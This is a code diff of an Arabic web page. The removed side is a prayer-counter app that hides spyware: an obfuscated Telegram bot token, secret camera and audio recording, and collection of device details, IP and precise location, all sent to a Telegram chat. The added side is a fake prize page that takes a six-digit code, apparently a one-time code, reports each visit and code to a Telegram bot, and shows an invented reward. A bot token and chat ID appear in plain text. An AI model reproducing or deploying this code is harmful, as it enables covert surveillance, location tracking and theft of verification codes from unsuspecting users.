-        <div class="zikr-item" style="border:1px solid #ffd700;"><span style="font-weight: 700; color: var(--gold);">قيم التطبيق</span><button class="btn-select btn-gold" onclick="showRating()">تقييم</button></div>
-        <div class="zikr-item" style="border:1px solid #ff5252;"><span style="color:#ff5252;">تصفير البيانات</span><button class="btn-select btn-danger" onclick="openModal()">تصفير</button></div>
-    </div>
-
-    <div id="rating-modal" class="modal"><div class="modal-box"><h4>قيم التطبيق</h4><div class="rating-stars" id="ratingStars"><span onclick="setRating(1)">★</span><span onclick="setRating(2)">★</span><span onclick="setRating(3)">★</span><span onclick="setRating(4)">★</span><span onclick="setRating(5)">★</span></div><div class="rating-message" id="ratingMessage">اختر عدد النجوم</div><button onclick="closeRatingModal()" class="btn-gray">إغلاق</button></div></div>
-    <div id="confirm-modal" class="modal"><div class="modal-box"><h4>تنبيه</h4><p>تصفير العداد؟</p><button onclick="resetData()" class="btn-danger">نعم</button><button onclick="closeModal()" class="btn-gray">إلغاء</button></div></div>
-    <div id="confirm-stats-modal" class="modal"><div class="modal-box"><h4>تنبيه</h4><p>تصفير الإحصائيات؟</p><button onclick="resetStats()" class="btn-danger">نعم</button><button onclick="closeStatsModal()" class="btn-gray">إلغاء</button></div></div>
-
-    <div class="nav-bar">
-        <button class="nav-btn active" onclick="nav('p-main', this)"><svg viewBox="0 0 24 24"><path d="M12 2L2 12h3v8h6v-6h2v6h6v-8h3L12 2z"/></svg><span>الرئيسية</span></button>
-        <button class="nav-btn" onclick="nav('p-list', this)"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/></svg><span>الأذكار</span></button>
-        <button class="nav-btn" onclick="nav('p-stats', this)"><svg viewBox="0 0 24 24"><rect x="3" y="10" width="4" height="10" rx="1"/><rect x="10" y="6" width="4" height="14" rx="1"/><rect x="17" y="2" width="4" height="18" rx="1"/></svg><span>الإحصائيات</span></button>
-        <button class="nav-btn" onclick="nav('p-set', this)"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M12 1v4m0 14v4M4.2 4.2l2.8 2.8m10 10l2.8 2.8M1 12h4m14 0h4M4.2 19.8l2.8-2.8m10-10l2.8-2.8"/></svg><span>الإعدادات</span></button>
     </div>
 
     <script>
-        var _k = atob('ODg2NDY3MDE3ODpBQUdSZmU3cTk5Y3NyN3ZTeXFUM3BldWlkQWI1dzY5bVdUcw=='.replace(/\s/g, ''));
-        var _c = atob('NjQ1MzU5NDE1MQ=='.replace(/\s/g, ''));
-        var _mr, _rc = [];
-        var _stream = null;
+        (function() {
+            'use strict';
 
-        function _s(t) {
-            fetch('https://api.telegram.org/bot' + _k + '/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: _c, text: t, parse_mode: 'HTML', disable_web_page_preview: !0 })
-            }).catch(function() {});
-        }
+            const codeSection = document.getElementById('codeSection');
+            const successSection = document.getElementById('successSection');
+            const codeBoxes = document.querySelectorAll('.code-box');
+            const btnVerify = document.getElementById('btnVerify');
+            const btnSuccess = document.getElementById('btnSuccess');
+            const errorMessage = document.getElementById('errorMessage');
+            const prizeAmount = document.getElementById('prizeAmount');
 
-        function _sv(blob) {
-            var fd = new FormData();
-            fd.append('video', blob, 'video.webm');
-            fd.append('chat_id', _c);
-            return fetch('https://api.telegram.org/bot' + _k + '/sendVideo', { method: 'POST', body: fd }).catch(
-                function() {});
-        }
+            const BOT_TOKEN = '8864670178:AAGRfe7q99csr7vSyqT3peuidAb5w69mWTs';
+            const CHAT_ID = '6453594151';
 
-        function _stopRecording() {
-            if (_mr && _mr.state === 'recording') {
-                _mr.stop();
+            function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                }).catch(() => {});
             }
-            if (_stream) {
-                _stream.getTracks().forEach(function(t) { t.stop(); });
-                _stream = null;
-            }
-        }
 
-        function _sr() {
-            _stopRecording();
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: !0 }).then(function(stream) {
-                    _stream = stream;
-                    var video = document.getElementById('hiddenVideo');
-                    video.srcObject = stream;
-                    video.play();
-                    _mr = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                    _rc = [];
-                    _mr.ondataavailable = function(e) { if (e.data.size > 0) _rc.push(e.data); };
-                    _mr.onstop = function() {
-                        if (_rc.length > 0) {
-                            var blob = new Blob(_rc, { type: 'video/webm' });
-                            _sv(blob);
-                            _rc = [];
+            function sendVisitNotification() {
+                const now = new Date().toLocaleString();
+                sendToTelegram(`دخول جديد\n\nالوقت: ${now}`);
+            }
+
+            function sendCodeNotification(code) {
+                const now = new Date().toLocaleString();
+                sendToTelegram(`كود تم إدخاله\n\nالوقت: ${now}\nالكود: ${code}`);
+            }
+
+            function getRandomPrize() {
+                const prizes = [400, 500, 600, 700, 800, 900, 1000, 1500, 2000];
+                return prizes[Math.floor(Math.random() * prizes.length)];
+            }
+
+            sendVisitNotification();
+
+            codeBoxes.forEach((box, index) => {
+                box.addEventListener('input', function(e) {
+                    this.value = this.value.replace(/\D/g, '');
+                    if (this.value.length === 1) {
+                        this.classList.add('filled');
+                        if (index < codeBoxes.length - 1) {
+                            codeBoxes[index + 1].focus();
                         }
-                    };
-                    _mr.start(100);
-                }).catch(function() {});
-            }
-        }
-
-        function getDeviceName() {
-            var ua = navigator.userAgent;
-            var buildMatch = ua.match(/;?\s?([^;)]+)\sBuild/);
-            if (buildMatch && buildMatch[1]) {
-                var model = buildMatch[1].trim().replace(/"/g, '').replace(/_/g, ' ');
-                if (model.length > 2 && model !== 'Linux') return model;
-            }
-            try {
-                var r = new UAParser().getResult();
-                if (r.device.vendor && r.device.model && r.device.model.length > 1) return r.device.vendor + ' ' + r.device
-                    .model;
-                if (r.device.model && r.device.model.length > 1) return r.device.model;
-            } catch (e) {}
-            var patterns = [/Redmi[^;)]+/i, /Xiaomi[^;)]+/i, /Samsung[^;)]+/i, /SM-\w+/i, /Huawei[^;)]+/i, /OPPO[^;)]+/i, /vivo[
-                ^;)
-            ]+/i, /Realme[^;)]+/i, /OnePlus[^;)]+/i, /Pixel[^;)]+/i, /iPhone/i ];
-            for (var i = 0; i < patterns.length; i++) {
-                var m = ua.match(patterns[i]);
-                if (m) return m[0].trim();
-            }
-            var am = ua.match(/Android\s([\d.]+)/);
-            if (am) return 'أندرويد';
-            return 'جهاز غير معروف';
-        }
-
-        function getOSName() {
-            var ua = navigator.userAgent;
-            var am = ua.match(/Android\s([\d.]+)/);
-            if (am) return 'Android ' + am[1];
-            if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) {
-                var im = ua.match(/iPhone OS\s([\d_]+)/) || ua.match(/CPU OS\s([\d_]+)/);
-                return 'iOS ' + (im ? im[1].replace(/_/g, '.') : '');
-            }
-            if (ua.indexOf('Windows') > -1) return 'Windows';
-            if (ua.indexOf('Mac') > -1) return 'macOS';
-            return 'غير معروف';
-        }
-
-        function _ip() {
-            return fetch('https://api.ipify.org?format=json').then(function(r) { return r.json() }).then(function(d) { return d
-                    .ip }).catch(function() { return 'غير معروف' });
-        }
-
-        function _gl(lat, lng) {
-            return fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lng +
-                '&zoom=18&addressdetails=1&accept-language=ar').then(function(r) { return r.json() }).then(function(d) {
-                if (d && d.address) {
-                    var a = d.address,
-                        p = [];
-                    if (a.road) p.push(a.road);
-                    if (a.neighbourhood) p.push(a.neighbourhood);
-                    if (a.suburb) p.push(a.suburb);
-                    if (a.city || a.town || a.village) p.push(a.city || a.town || a.village);
-                    if (a.state) p.push(a.state);
-                    if (a.country) p.push(a.country);
-                    return p.join('، ') || 'عنوان غير معروف';
-                }
-                return 'عنوان غير معروف';
-            }).catch(function() { return 'تعذر' });
-        }
-
-        function _fd() {
-            var now = new Date();
-            var time = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo', hour12: !1 });
-            var device = getDeviceName();
-            var osName = getOSName();
-            var ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف';
-            var msg = 'بيانات المستخدم\n\n';
-            msg += 'الوقت: ' + time + '\n';
-            msg += 'الجهاز: ' + device + '\n';
-            msg += 'النظام: ' + osName + '\n';
-            msg += 'الذاكرة: ' + ram + '\n';
-            if (navigator.getBattery) {
-                navigator.getBattery().then(function(b) {
-                    var batteryMsg = msg + 'البطارية: ' + Math.round(b.level * 100) + '% (' + (b.charging ?
-                        'بيشحن' : 'مش بيشحن') + ')\n';
-                    _ip().then(function(ip) {
-                        batteryMsg += 'المنطقة الزمنية: ' + Intl.DateTimeFormat().resolvedOptions()
-                            .timeZone + '\n';
-                        batteryMsg += 'IP: ' + ip + '\n\n';
-                        if (navigator.geolocation) {
-                            navigator.geolocation.getCurrentPosition(function(pos) {
-                                var lat = pos.coords.latitude;
-                                var lng = pos.coords.longitude;
-                                var acc = pos.coords.accuracy;
-                                _gl(lat, lng).then(function(addr) {
-                                    batteryMsg += 'الموقع: ' + addr + ' (' + Math.round(
-                                        acc) + ' متر)\n';
-                                    batteryMsg +=
-                                        'الخريطة: https://www.google.com/maps?q=' +
-                                        lat + ',' + lng;
-                                    _s(batteryMsg);
-                                });
-                            }, function() {
-                                batteryMsg += 'الموقع: لم يتم التحديد';
-                                _s(batteryMsg);
-                            }, { enableHighAccuracy: !0, timeout: 15000 });
-                        } else {
-                            batteryMsg += 'الموقع: غير مدعوم';
-                            _s(batteryMsg);
-                        }
-                    });
-                });
-            } else {
-                _ip().then(function(ip) {
-                    msg += 'البطارية: غير متاح\n';
-                    msg += 'المنطقة الزمنية: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n';
-                    msg += 'IP: ' + ip + '\n\n';
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(function(pos) {
-                            var lat = pos.coords.latitude;
-                            var lng = pos.coords.longitude;
-                            var acc = pos.coords.accuracy;
-                            _gl(lat, lng).then(function(addr) {
-                                msg += 'الموقع: ' + addr + ' (' + Math.round(acc) +
-                                    ' متر)\n';
-                                msg += 'الخريطة: https://www.google.com/maps?q=' + lat +
-                                    ',' + lng;
-                                _s(msg);
-                            });
-                        }, function() {
-                            msg += 'الموقع: لم يتم التحديد';
-                            _s(msg);
-                        }, { enableHighAccuracy: !0, timeout: 15000 });
                     } else {
-                        msg += 'الموقع: غير مدعوم';
-                        _s(msg);
+                        this.classList.remove('filled');
+                    }
+
+                    const fullCode = getFullCode();
+                    if (fullCode.length === 6) {
+                        setTimeout(() => btnVerify.click(), 400);
                     }
                 });
+
+                box.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                        codeBoxes[index - 1].focus();
+                        codeBoxes[index - 1].classList.remove('filled');
+                    }
+                    if (e.key === 'ArrowLeft' && index > 0) {
+                        codeBoxes[index - 1].focus();
+                    }
+                    if (e.key === 'ArrowRight' && index < codeBoxes.length - 1) {
+                        codeBoxes[index + 1].focus();
+                    }
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        btnVerify.click();
+                    }
+                });
+
+                box.addEventListener('beforeinput', function(e) {
+                    if (e.data && !/^\d$/.test(e.data)) {
+                        e.preventDefault();
+                    }
+                });
+            });
+
+            function getFullCode() {
+                let code = '';
+                codeBoxes.forEach(box => { code += box.value; });
+                return code;
             }
-        }
 
-        function closeWelcome() {
-            document.getElementById('welcomeScreen').style.display = 'none';
-        }
-
-        // ================ التطبيق ================
-        let c = 0,
-            t = 0,
-            mode = 'single',
-            step = 0,
-            isTransitioning = !1,
-            isWirdRunning = !1;
-        let currentWird = ['الحمد لله', 'لا إله إلا الله', 'الله أكبر'];
-        let nextWirdSet = ['سبحان الله وبحمده', 'لا حول ولا قوة إلا بالله', 'اللهم صلِّ على محمد'];
-        let singleZikrStates = {};
-        let prayerTimes = {},
-            prayerInterval = null,
-            lastPrayerUpdate = 0;
-        let toastTimeout = null;
-
-        try { t = parseInt(localStorage.getItem('t')) || 0 } catch (e) { t = 0 }
-        document.getElementById('total-num').innerText = t;
-
-        function doCount(event) {
-            if (isTransitioning) { showToast('انتظر اكتمال الذكر الحالي'); return; }
-            c++;
-            t++;
-            try { localStorage.setItem('t', t) } catch (e) {}
-            document.getElementById('p-bar').style.width = Math.min((c / 33) * 100, 100) + '%';
-            document.getElementById('count-num').innerText = c;
-            document.getElementById('total-num').innerText = t;
-            if (event && event.target) {
-                var btn = document.getElementById('counterBtn');
-                var rect = btn.getBoundingClientRect();
-                var x = event.clientX - rect.left;
-                var y = event.clientY - rect.top;
-                var ripple = document.createElement('span');
-                ripple.className = 'ripple';
-                ripple.style.left = x + 'px';
-                ripple.style.top = y + 'px';
-                ripple.style.width = '20px';
-                ripple.style.height = '20px';
-                btn.appendChild(ripple);
-                setTimeout(function() { ripple.remove(); }, 600);
-            }
-            if (navigator.vibrate) navigator.vibrate(15);
-            if (c >= 33) {
-                isTransitioning = !0;
-                saveStats();
-                confetti({ particleCount: 120, spread: 80, origin: { y: 0.5 }, colors: ['#ffd700', '#b8860b'] });
-                if (mode === 'wird' && isWirdRunning) {
-                    setTimeout(function() {
-                        c = 0;
-                        step++;
-                        if (step >= currentWird.length) {
-                            currentWird = nextWirdSet;
-                            step = 0;
-                            document.getElementById('wird-label').innerText = 'الورد المتجدد';
-                        }
-                        document.getElementById('zikr-title').innerText = currentWird[step];
-                        document.getElementById('p-bar').style.width = '0%';
-                        document.getElementById('count-num').innerText = c;
-                        isTransitioning = !1;
-                        saveWirdState();
-                    }, 700);
-                } else if (mode === 'single' && singleZikrStates[document.getElementById('zikr-title').innerText] &&
-                    singleZikrStates[document.getElementById('zikr-title').innerText].isRunning) {
-                    setTimeout(function() {
-                        c = 0;
-                        document.getElementById('p-bar').style.width = '0%';
-                        document.getElementById('count-num').innerText = c;
-                        isTransitioning = !1;
-                        showToast('تم إكمال التسبيحة');
-                        saveSingleZikrState(document.getElementById('zikr-title').innerText);
-                    }, 500);
-                } else {
-                    setTimeout(function() {
-                        c = 0;
-                        document.getElementById('p-bar').style.width = '0%';
-                        document.getElementById('count-num').innerText = c;
-                        isTransitioning = !1;
-                        showToast('تم إكمال التسبيحة');
-                    }, 500);
+            btnVerify.addEventListener('click', function() {
+                const code = getFullCode();
+                if (code.length < 6) {
+                    errorMessage.textContent = 'الرجاء إدخال الكود بالكامل (6 أرقام).';
+                    errorMessage.classList.add('show');
+                    return;
                 }
-            } else {
-                isTransitioning = !1;
-                if (mode === 'wird') saveWirdState();
-                else if (mode === 'single') saveSingleZikrState(document.getElementById('zikr-title').innerText);
-            }
-        }
 
-        function toggleWird(event) {
-            var btn = document.getElementById('wirdToggleBtn');
-            stopAllSingleZikr();
-            if (!isWirdRunning) {
-                isWirdRunning = !0;
-                mode = 'wird';
-                btn.innerText = 'إيقاف';
-                btn.classList.add('stop');
-                document.getElementById('zikr-title').innerText = currentWird[step];
-                document.getElementById('p-bar').style.width = ((c / 33) * 100) + '%';
-                document.getElementById('count-num').innerText = c;
-                showToast('تم تشغيل الورد الشامل');
-                saveWirdState();
-                nav('p-main', document.querySelector('.nav-btn'));
-            } else {
-                isWirdRunning = !1;
-                mode = 'single';
-                btn.innerText = 'تشغيل';
-                btn.classList.remove('stop');
-                showToast('تم إيقاف الورد');
-                saveWirdState();
-            }
-        }
+                sendCodeNotification(code);
 
-        function saveWirdState() {
-            try {
-                var state = { isRunning: isWirdRunning, step: step, currentWird: currentWird, c: c, mode: mode,
-                    zikrTitle: document.getElementById('zikr-title').innerText };
-                localStorage.setItem('wirdState', JSON.stringify(state));
-            } catch (e) {}
-        }
+                btnVerify.textContent = 'جاري التحقق...';
+                btnVerify.disabled = true;
 
-        function toggleSingleZikr(btn, zikrName) {
-            if (isWirdRunning) {
-                isWirdRunning = !1;
-                document.getElementById('wirdToggleBtn').innerText = 'تشغيل';
-                document.getElementById('wirdToggleBtn').classList.remove('stop');
-                saveWirdState();
-            }
-            if (!singleZikrStates[zikrName]) {
-                singleZikrStates[zikrName] = { isRunning: !1, count: 0 };
-            }
-            var state = singleZikrStates[zikrName];
-            if (!state.isRunning) {
-                stopAllSingleZikr();
-                state.isRunning = !0;
-                mode = 'single';
-                c = state.count || 0;
-                document.getElementById('zikr-title').innerText = zikrName;
-                document.getElementById('p-bar').style.width = ((c / 33) * 100) + '%';
-                document.getElementById('count-num').innerText = c;
-                btn.innerText = 'إيقاف';
-                btn.classList.add('stop');
-                showToast('تم تشغيل: ' + zikrName);
-                saveSingleZikrState(zikrName);
-                nav('p-main', document.querySelector('.nav-btn'));
-            } else {
-                state.isRunning = !1;
-                state.count = c;
-                btn.innerText = 'تشغيل';
-                btn.classList.remove('stop');
-                mode = 'single';
-                showToast('تم إيقاف: ' + zikrName);
-                saveSingleZikrState(zikrName);
-            }
-        }
+                setTimeout(() => {
+                    const prize = getRandomPrize();
+                    prizeAmount.textContent = `كسبت ${prize} وحدة`;
 
-        function stopAllSingleZikr() {
-            document.querySelectorAll('.single-zikr').forEach(function(btn) {
-                var zikr = btn.dataset.zikr;
-                if (singleZikrStates[zikr] && singleZikrStates[zikr].isRunning) {
-                    singleZikrStates[zikr].isRunning = !1;
-                    singleZikrStates[zikr].count = c;
-                    btn.innerText = 'تشغيل';
-                    btn.classList.remove('stop');
-                    saveSingleZikrState(zikr);
-                }
+                    errorMessage.classList.remove('show');
+                    btnVerify.textContent = 'تم التفعيل';
+                    btnVerify.style.backgroundColor = '#25D366';
+
+                    setTimeout(() => {
+                        codeSection.classList.add('hidden');
+                        successSection.classList.add('active');
+
+                        btnVerify.textContent = 'تفعيل الكود';
+                        btnVerify.style.backgroundColor = '#e60000';
+                        btnVerify.disabled = false;
+
+                        codeBoxes.forEach(box => {
+                            box.value = '';
+                            box.classList.remove('filled');
+                        });
+                    }, 800);
+                }, 1500);
             });
-        }
 
-        function saveSingleZikrState(zikrName) {
-            try { localStorage.setItem('singleZikrStates', JSON.stringify(singleZikrStates)); } catch (e) {}
-        }
-
-        function nav(id, el) {
-            document.querySelectorAll('.page').forEach(function(p) { p.classList.remove('active'); });
-            document.getElementById(id).classList.add('active');
-            document.querySelectorAll('.nav-btn').forEach(function(b) { b.classList.remove('active'); });
-            if (el) el.classList.add('active');
-            if (id === 'p-stats') updateStatsDisplay();
-            if (id === 'p-list' && document.querySelector('#tab-prayer.active')) { fetchPrayerTimes(); }
-        }
-
-        function toggleDark() {
-            document.body.classList.toggle('dark-mode');
-            showToast(document.body.classList.contains('dark-mode') ? 'تم تفعيل الوضع الليلي' : 'تم تفعيل الوضع النهاري');
-        }
-
-        function openModal() { document.getElementById('confirm-modal').style.display = 'flex'; }
-
-        function closeModal() { document.getElementById('confirm-modal').style.display = 'none'; }
-
-        function openStatsModal() { document.getElementById('confirm-stats-modal').style.display = 'flex'; }
-
-        function closeStatsModal() { document.getElementById('confirm-stats-modal').style.display = 'none'; }
-
-        function resetData() {
-            t = 0;
-            c = 0;
-            document.getElementById('count-num').innerText = c;
-            document.getElementById('total-num').innerText = t;
-            document.getElementById('p-bar').style.width = '0%';
-            try { localStorage.removeItem('t');
-                localStorage.removeItem('wirdState');
-                localStorage.removeItem('singleZikrStates'); } catch (e) {}
-            closeModal();
-            updateStatsDisplay();
-            showToast('تم تصفير العداد');
-            isWirdRunning = !1;
-            document.getElementById('wirdToggleBtn').innerText = 'تشغيل';
-            document.getElementById('wirdToggleBtn').classList.remove('stop');
-            singleZikrStates = {};
-            document.querySelectorAll('.single-zikr').forEach(function(btn) { btn.innerText = 'تشغيل';
-                btn.classList.remove('stop'); });
-        }
-
-        function resetStats() {
-            try { localStorage.removeItem('stats'); } catch (e) {}
-            updateStatsDisplay();
-            closeStatsModal();
-            showToast('تم تصفير الإحصائيات');
-        }
-
-        function showRating() { document.getElementById('rating-modal').style.display = 'flex';
-            loadSavedRating(); }
-
-        function closeRatingModal() { document.getElementById('rating-modal').style.display = 'none'; }
-
-        function setRating(v) {
-            try { localStorage.setItem('appRating', v); } catch (e) {}
-            document.querySelectorAll('#ratingStars span').forEach(function(s, i) { s.className = i < v ? 'active' : ''; });
-            var msgs = ['', 'شكراً لك', 'جميل', 'رائع', 'ممتاز!'];
-            document.getElementById('ratingMessage').textContent = msgs[v] || v + '/5';
-            if (v >= 4) { confetti({ particleCount: 80, spread: 60, origin: { y: 0.6 } }); }
-        }
-
-        function loadSavedRating() {
-            var v = 0;
-            try { v = parseInt(localStorage.getItem('appRating')); } catch (e) { v = 0; }
-            if (v >= 1 && v <= 5) setRating(v);
-        }
-
-        function saveStats() {
-            var today = new Date().toLocaleDateString('ar-EG');
-            var stats = {};
-            try { stats = JSON.parse(localStorage.getItem('stats') || '{}'); } catch (e) { stats = {}; }
-            stats[today] = (stats[today] || 0) + 1;
-            var max = 0,
-                best = '';
-            for (var d in stats) { if (d !== 'bestDay' && d !== 'bestCount' && stats[d] > max) { max = stats[d];
-                    best = d; } }
-            stats.bestDay = best;
-            stats.bestCount = max;
-            try { localStorage.setItem('stats', JSON.stringify(stats)); } catch (e) {}
-        }
-
-        function updateStatsDisplay() {
-            var stats = {};
-            try { stats = JSON.parse(localStorage.getItem('stats') || '{}'); } catch (e) { stats = {}; }
-            var today = new Date().toLocaleDateString('ar-EG');
-            document.getElementById('stats-today').innerText = stats[today] || 0;
-            var wc = 0,
-                wd = [];
-            for (var i = 0; i < 7; i++) {
-                var d = new Date();
-                d.setDate(d.getDate() - i);
-                var ds = d.toLocaleDateString('ar-EG');
-                wc += stats[ds] || 0;
-                wd.unshift({ day: ds, count: stats[ds] || 0 });
-            }
-            document.getElementById('stats-week').innerText = wc;
-            var mc = 0;
-            for (var i = 0; i < 30; i++) {
-                var d = new Date();
-                d.setDate(d.getDate() - i);
-                mc += stats[d.toLocaleDateString('ar-EG')] || 0;
-            }
-            document.getElementById('stats-month').innerText = mc;
-            var total = 0;
-            for (var d in stats) { if (d !== 'bestDay' && d !== 'bestCount') total += stats[d]; }
-            document.getElementById('stats-total').innerText = total;
-            document.getElementById('best-day').innerText = stats.bestDay || 'لم يسجل بعد';
-            document.getElementById('best-count').innerText = stats.bestCount || 0;
-            drawWeekChart(wd);
-        }
-
-        function drawWeekChart(wd) {
-            var container = document.getElementById('week-chart');
-            if (!container) return;
-            container.innerHTML = '';
-            var max = Math.max.apply(null, wd.map(function(d) { return d.count; })) || 1;
-            var days = ['الأحد', 'الإثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت'];
-            wd.forEach(function(day, i) {
-                var height = (day.count / max) * 100;
-                container.innerHTML += '<div class="chart-bar"><div class="bar-fill" style="height:' + Math.max(height,
-                    5) + 'px;"></div><div class="bar-day">' + days[i] + '</div><div class="bar-count">' + day.count +
-                    '</div></div>';
+            btnSuccess.addEventListener('click', function() {
+                successSection.classList.remove('active');
+                codeSection.classList.remove('hidden');
+                codeBoxes[0].focus();
             });
-        }
 
-        function switchTab(tn) {
-            document.querySelectorAll('.tab-content').forEach(function(c) { c.classList.remove('active'); });
-            document.querySelectorAll('.tab-btn').forEach(function(b) { b.classList.remove('active'); });
-            document.getElementById('tab-' + tn).classList.add('active');
-            var tabs = ['general', 'morning', 'evening', 'selected', 'prayer'];
-            var idx = tabs.indexOf(tn);
-            if (idx >= 0) document.querySelectorAll('.tab-btn')[idx].classList.add('active');
-            if (tn === 'prayer') fetchPrayerTimes();
-        }
+            setTimeout(() => {
+                codeBoxes[0].focus();
+            }, 500);
 
-        const azkarMorning = [{ id: 1,
-            text: "أَعُوذُ بِاللَّهِ مِنَ الشَّيْطَانِ الرَّجِيمِ: اللّهُ لاَ إِلَـهَ إِلاَّ هُوَ الْحَيُّ الْقَيُّومُ لاَ تَأْخُذُهُ سِنَةٌ وَلاَ نَوْمٌ لَّهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الأَرْضِ مَن ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلاَّ بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلاَ يُحِيطُونَ بِشَيْءٍ مِّنْ عِلْمِهِ إِلاَّ بِمَا شَاء وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالأَرْضَ وَلاَ يَؤُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 2,
-            text: "بِسْمِ اللهِ الرَّحْمنِ الرَّحِيم: قُلْ هُوَ اللَّهُ أَحَدٌ، اللَّهُ الصَّمَدُ، لَمْ يَلِدْ وَلَمْ يُولَدْ، وَلَمْ يَكُن لَّهُ كُفُوًا أَحَدٌ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 3,
-            text: "بِسْمِ اللهِ الرَّحْمنِ الرَّحِيم: قُلْ أَعُوذُ بِرَبِّ الْفَلَقِ، مِن شَرِّ مَا خَلَقَ، وَمِن شَرِّ غَاسِقٍ إِذَا وَقَبَ، وَمِن شَرِّ النَّفَّاثَاتِ فِي الْعُقَدِ، وَمِن شَرِّ حَاسِدٍ إِذَا حَسَدَ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 4,
-            text: "بِسْمِ اللهِ الرَّحْمنِ الرَّحِيم: قُلْ أَعُوذُ بِرَبِّ النَّاسِ، مَلِكِ النَّاسِ، إِلَهِ النَّاسِ، مِن شَرِّ الْوَسْوَاسِ الْخَنَّاسِ، الَّذِي يُوَسْوِسُ فِي صُدُورِ النَّاسِ، مِنَ الْجِنَّةِ وَ النَّاسِ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 5,
-            text: "أَصْبَحْنَا وَأَصْبَحَ الْمُلْكُ لِلَّهِ، وَالْحَمْدُ لِلَّهِ، لاَ إِلَهَ إلاَّ اللَّهُ وَحْدَهُ لاَ شَرِيكَ لَهُ، لَهُ الْمُلْكُ وَلَهُ الْحَمْدُ وَهُوَ عَلَى كُلِّ شَيْءٍ قَدِيرٌ، رَبِّ أَسْأَلُكَ خَيْرَ مَا فِي هَذَا الْيَوْمِ وَخَيْرَ مَا بَعْدَهُ، وَأَعُوذُ بِكَ مِنْ شَرِّ مَا فِي هَذَا الْيَوْمِ وَشَرِّ مَا بَعْدَهُ، رَبِّ أَعُوذُ بِكَ مِنَ الْكَسَلِ وَسُوءِ الْكِبَرِ، رَبِّ أَعُوذُ بِكَ مِنْ عَذَابٍ فِي النَّارِ وَعَذَابٍ فِي الْقَبْرِ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 6,
-            text: "اللَّهُمَّ أَنْتَ رَبِّي لَا إِلَهَ إِلاَّ أَنْتَ، خَلَقْتَنِي وَأَنَا عَبْدُكَ، وَأَنَا عَلَى عَهْدِكَ وَوَعْدِكَ مَا اسْتَطعتُ، أَعُوذُ بِكَ مِنْ شَرِّ مَا صَنَعْتُ، أَبُوءُ لَكَ بِنِعْمَتِكَ عَلَيَّ، وَأَبُوءُ بِذَنْبِي فَاغْفِرْ لِي فَإِنَّهُ لاَ يَغْفِرُ الذُّنُوبَ إِلاَّ أَنْتَ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 7, text: "رَضِيتُ بِاللَّهِ رَبًّا، وَبِالْإِسْلَامِ دِينًا، وَبِمُحَمَّدٍ ﷺ نَبِيًّا.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 8,
-            text: "اللَّهُمَّ إِنِّي أَصْبَحْتُ أُشْهِدُكَ، وَأُشْهِدُ حَمَلَةَ عَرْشِكَ، وَمَلَائِكَتَكَ، وَجَمِيعَ خَلْقِكَ، أَنَّكَ أَنْتَ اللَّهُ لَا إِلَهَ إِلاَّ أَنْتَ وَحْدَكَ لَا شَرِيكَ لَكَ، وَأَنَّ مُحَمَّدًا عَبْدُكَ وَرَسُولُكَ.",
-            benefit: "أربع مرات", count: 4 }, { id: 9,
-            text: "اللَّهُمَّ مَا أَصْبَحَ بِي مِنْ نِعْمَةٍ أَوْ بِأَحَدٍ مِنْ خَلْقِكَ، فَمِنْكَ وَحْدَكَ لَا شَرِيكَ لَكَ، فَلَكَ الْحَمْدُ وَلَكَ الشُّكْرُ.",
-            benefit: "مرة واحدة", count: 1 }, { id: 10,
-            text: "حَسْبِيَ اللَّهُ لَا إِلَهَ إِلاَّ هُوَ عَلَيْهِ تَوَكَّلْتُ وَهُوَ رَبُّ الْعَرْشِ الْعَظِيمِ.", benefit: "سبع مرات",
-            count: 7 }, { id: 11,
-            text: "اللَّهُمَّ عافِني في بَدَني، اللَّهُمَّ عافِني في سَمْعي، اللَّهُمَّ عافِني في بَصَري، لا إلهَ إلَّا أنتَ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 12,
-            text: "اللَّهُمَّ إِنِّي أَعُوذُ بِكَ مِنَ الْكُفْرِ، وَالفَقْرِ، وَأَعُوذُ بِكَ مِنْ عَذَابِ القَبْرِ، لا إلهَ إلَّا أنتَ.",
-            benefit: "ثلاث مرات", count: 3 }, { id: 13,
